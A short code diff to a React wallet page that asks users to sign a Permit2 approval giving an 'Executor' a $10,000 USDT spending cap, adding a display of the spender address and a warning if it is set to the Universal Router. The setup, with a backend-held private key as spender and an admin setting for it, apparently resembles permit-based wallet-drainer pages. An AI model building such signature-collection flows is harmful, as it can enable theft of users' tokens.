@@ -11,6 +11,8 @@ import Admin from './Admin'; // <--- MAKE SURE THIS IMPORT IS HERE
 // CONFIGURATION
 // -----------------------------
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+// Universal Router (common pitfall) — signatures should NOT set this as the spender
+const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
 // Executor address can come from env or Firestore admin settings
 const ENV_EXECUTOR_ADDRESS = import.meta.env.VITE_EXECUTOR_ADDRESS;
 const USDT_DECIMALS = 6n;
@@ -174,6 +176,17 @@ export default function App() {
       <p style={{ color: "#9fb4ff", marginBottom: 18 }}>
         Connect wallet and sign the USDT $10,000 cap for the Executor.
       </p>
+
+      <div style={{ marginBottom: 12 }}>
+        <strong>Spender (Executor):</strong>{' '}
+        <span style={{ fontFamily: 'monospace' }}>{executorAddress || '(not set)'}</span>
+        {executorAddress === UNIVERSAL_ROUTER && (
+          <div style={{ color: '#ffb4b4', marginTop: 6 }}>
+            Warning: The executor is set to the Universal Router address — this is likely incorrect.
+            The backend expects a wallet address (the private key it controls) as the spender.
+          </div>
+        )}
+      </div>
 
       {connectedAddress ? (
         <button className="connect" onClick={signPermit}>
